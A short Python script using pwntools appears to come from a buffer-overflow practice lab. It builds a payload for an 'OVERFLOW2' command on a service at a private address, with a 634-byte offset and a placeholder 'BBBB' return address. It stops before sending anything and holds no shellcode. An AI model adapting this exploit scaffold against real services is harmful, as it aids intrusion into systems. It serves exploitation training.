#!/usr/bin/env python3

from pwn import *

host = "10.10.107.134"
port = 1337

s = remote(host, port)
total_length = 1000
offset = 634
new_eip = b"BBBB"

payload = [
    b"OVERFLOW2 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip))


]

payload = b"".join(payload)
